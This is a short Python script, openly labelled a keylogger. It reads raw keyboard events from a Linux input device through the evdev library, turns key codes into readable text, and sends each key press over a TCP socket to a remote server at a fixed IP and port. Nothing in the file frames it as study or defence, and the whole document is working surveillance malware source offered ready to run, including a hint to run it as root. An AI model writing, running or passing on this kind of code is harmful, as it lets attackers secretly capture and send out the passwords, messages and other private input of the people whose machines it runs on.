import socket
import evdev
from evdev import InputDevice, ecodes

# Server details
server_ip = '10.0.2.15'  # Server IP address (localhost for testing)
server_port = 12345      # Port on which the server is listening

# Input device (change it to the correct device path for your system)
input_device_path = '/dev/input/event0'  # Update with the correct device file for your keyboard

# Function to send keystrokes to the server
def send_keystroke_to_server(key):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))  # Connect to the server
            s.sendall(key.encode('utf-8'))  # Send keystroke to the server
    except Exception as e:
        print(f"Error sending data to server: {e}")

# Function to capture and log keystrokes
def capture_keystrokes():
    try:
        # Open the input device
        dev = InputDevice(input_device_path)

        # Loop to capture and process key events
        for event in dev.read_loop():
            if event.type == ecodes.EV_KEY:
                key = evdev.ecodes.KEY[event.code]
                if event.value == 1:  # Key press
                    # Special handling for certain keys
                    if key == 'KEY_SPACE':
                        key_pressed = ' '
                    elif key == 'KEY_ENTER':
                        key_pressed = '[Enter]'
                    elif key == 'KEY_BACKSPACE':
                        key_pressed = '[Backspace]'
                    elif key == 'KEY_LEFTSHIFT' or key == 'KEY_RIGHTSHIFT':
                        key_pressed = '[Shift]'
                    elif key == 'KEY_LEFTCTRL' or key == 'KEY_RIGHTCTRL':
                        key_pressed = '[Ctrl]'
                    elif key == 'KEY_LEFTALT' or key == 'KEY_RIGHTALT':
                        key_pressed = '[Alt]'
                    else:
                        key_pressed = key.lower()  # Convert to lowercase for human-readable form

                    # Send the captured key to the server
                    send_keystroke_to_server(key_pressed)

    except FileNotFoundError:
        print(f"Input device {input_device_path} not found. Check your keyboard device path.")
    except PermissionError:
        print(f"Permission denied: Unable to access {input_device_path}. Try running as root.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    print("Keylogger started. Press Ctrl+C to stop.")
    capture_keystrokes()
